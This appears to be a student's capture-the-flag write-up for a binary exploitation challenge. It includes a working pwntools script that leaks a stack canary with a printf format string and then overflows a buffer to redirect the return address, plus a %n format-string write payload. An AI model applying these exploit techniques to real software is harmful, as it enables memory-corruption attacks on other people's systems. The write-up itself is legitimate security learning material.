#ctf 
[[Stack]], [[osusecctf 030424 - W9 - printf()]], [[tumble]]

### 03/04/24
# Inauguration
### PWN

---
## 1.

> side note, ik the number of headers is atrocious, but it formats decently in obsidian and it's too late to change conventions.

For this challenge, we are given access to a buffer that is then `printf`'d back out to the terminal. Because of the offset feature of printf, we are able to overflow into memory and hijack a stack canary. Afterwards, we need to just overflow the last input box to update the return address to dump the flag (found in ghidra), and to restore the canary. This can be done with this script:

```python
from pwn import *

flag_func_addr = p64(0x004013ab)
r = remote('chal.ctf-league.osusec.org', 1335)

# Agree to terms
r.recvuntil(b"(y/n) ")
r.sendline(b"y")

# Send our name :sunglasses:
r.recvuntil(b"name: ")

# Steal the stack canary :100:
r.sendline(b"%13$llx") # 5 registers and 8 locals (I don't actually know if this is canary or not)
output = r.recvuntil(b"date: ")
print(output)
canary = int(output.split()[1], 16)
print(f"Canary: {hex(canary)}")


# Overflow the date
r.sendline(b"A" * 40 + p64(canary) + b"A" * 8 + flag_func_addr)

r.interactive()
```

## 2.
Part 2 of the challenge is much less complicated. We just need to send an input that uses the `%n` formatter to overwrite a specific value with the flag. Trial and error (b/c counting bits is hard) led to this solution: `1%13$n _____`. Breaking this down:
1. `1` is an arbitrary character with width $w$ of 1.
2. `%n` writes the width $w$ of the preceding input into parameter $p$.
3. `$13` indicates $p$ should be offset from this data by 13 places
Combined, this overwrites $p$ to store $w$, which is checked in the code as a condition for dropping the flag.
